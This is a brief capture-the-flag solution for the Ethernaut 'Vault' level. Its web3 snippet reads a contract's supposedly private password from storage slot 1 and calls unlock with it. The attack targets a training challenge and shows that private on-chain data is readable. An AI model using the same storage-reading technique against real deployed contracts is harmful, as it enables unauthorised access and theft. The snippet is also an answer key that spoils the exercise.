# Vault

[Vault](https://ethernaut.openzeppelin.com/level/0xBA97454449c10a0F04297022646E7750b8954EE8)


## Live Attack

// Contract Address: 0xB309aC0a59E4990d8a57Ef9257f3ab49577c4CBa

```BASH
vault = await Vault.at("0xB309aC0a59E4990d8a57Ef9257f3ab49577c4CBa")
pass  = await web3.eth.getStorageAt(vault.address, 1)
sender = accounts[5]

await vault.locked()
await vault.unlock(pass, {from: sender})
await vault.locked()
```
